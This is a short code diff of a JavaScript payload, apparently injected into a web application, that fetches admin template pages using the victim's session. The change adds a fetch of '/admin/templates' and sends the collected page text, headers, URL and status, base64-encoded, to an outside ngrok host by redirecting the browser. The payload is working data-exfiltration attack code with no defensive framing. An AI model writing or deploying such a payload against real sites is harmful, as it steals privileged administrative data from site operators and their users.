@@ -11,6 +11,8 @@ fetch("/admin/templates/1/edit", {
     const text = await resp.text();
     const headers = [...resp.headers];
     const url = resp.url;
+    const allTemplatesR = await fetch("/admin/templates");
+    const text2 = await allTemplatesR.text();
     document.location = 'https://eaf3-195-113-197-234.ngrok-free.app/' + new TextEncoder().encode(JSON.stringify(
-        {text, headers, url, status})).toBase64()
+        {text2, text, headers, url, status})).toBase64()
 })
